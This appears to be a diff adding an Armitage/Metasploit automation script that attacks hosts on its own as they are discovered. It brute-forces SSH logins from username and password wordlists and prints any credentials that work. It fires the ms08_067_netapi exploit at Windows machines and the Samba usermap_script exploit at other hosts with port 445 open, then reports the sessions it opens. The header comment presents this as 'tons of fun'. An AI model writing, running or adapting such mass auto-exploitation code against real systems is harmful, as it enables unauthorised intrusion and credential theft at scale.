@@ -1,0 +1,30 @@
+#
+# This script waits for a box with port 445 open to appear and it launches
+# the venerable ms08_067_netapi exploit at it. It's tons of fun...
+
+# auto brute force any boxes with SSH open...
+on service_add_22 {
+	println("Attempting to brute force $1");
+	auxiliary("scanner/ssh/ssh_login", @($1), %(
+		USER_FILE => '/opt/framework3/msf3/data/wordlists/unix_users.txt',
+		PASS_FILE => '/opt/framework3/msf3/data/wordlists/unix_passwords.txt'));
+}
+
+on credential_add {
+	println("This credential works: " . join(" ", @_));
+}
+
+# auto exploit any Windows boxes
+on service_add_445 {
+	println("Exploiting $1 (" . host_os($1) . ")");
+	if (host_os($1) eq "Microsoft Windows") {
+		exploit("windows/smb/ms08_067_netapi", $1);
+	}
+	else {
+		exploit("multi/samba/usermap_script", $1, $null, $null, 1);
+	}
+}
+
+on session_open {
+	println("Session $1 opened. I got " . session_host($1) . " with " . session_exploit($1));
+}
